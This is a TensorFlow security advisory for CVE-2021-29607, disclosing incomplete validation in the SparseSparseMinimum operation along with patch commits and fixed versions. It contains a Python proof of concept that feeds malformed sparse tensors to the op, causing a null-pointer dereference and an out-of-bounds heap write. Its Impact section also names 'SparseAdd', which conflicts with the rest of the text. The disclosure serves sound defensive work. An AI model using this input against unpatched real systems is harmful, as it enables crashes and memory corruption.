## TFSA-2021-097: Incomplete validation in `SparseSparseMinimum`

### CVE Number
CVE-2021-29607

### Impact
Incomplete validation in `SparseAdd` results in allowing attackers to exploit
undefined behavior (dereferencing null pointers) as well as write outside of
bounds of heap allocated data:

```python
import tensorflow as tf

a_indices = tf.ones([45, 92], dtype=tf.int64)
a_values = tf.ones([45], dtype=tf.int64)
a_shape = tf.ones([1], dtype=tf.int64)
b_indices = tf.ones([1, 1], dtype=tf.int64)
b_values = tf.ones([1], dtype=tf.int64)
b_shape = tf.ones([1], dtype=tf.int64)

tf.raw_ops.SparseSparseMinimum(a_indices=a_indices,
    a_values=a_values,
    a_shape=a_shape,
    b_indices=b_indices,
    b_values=b_values,
    b_shape=b_shape)
```

The
[implementation](https://github.com/tensorflow/tensorflow/blob/656e7673b14acd7835dc778867f84916c6d1cac2/tensorflow/core/kernels/sparse_sparse_binary_op_shared.cc)
has a large set of validation for the two sparse tensor inputs (6 tensors in
total), but does not validate that the tensors are not empty or that the second
dimension of `*_indices` matches the size of corresponding `*_shape`. This
allows attackers to send tensor triples that represent invalid sparse tensors to
abuse code assumptions that are not protected by validation.

### Patches
We have patched the issue in GitHub commit
[ba6822bd7b7324ba201a28b2f278c29a98edbef2](https://github.com/tensorflow/tensorflow/commit/ba6822bd7b7324ba201a28b2f278c29a98edbef2)
followed by GitHub commit
[f6fde895ef9c77d848061c0517f19d0ec2682f3a](https://github.com/tensorflow/tensorflow/commit/f6fde895ef9c77d848061c0517f19d0ec2682f3a).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
2.1.4, as these are also affected and still in supported range.
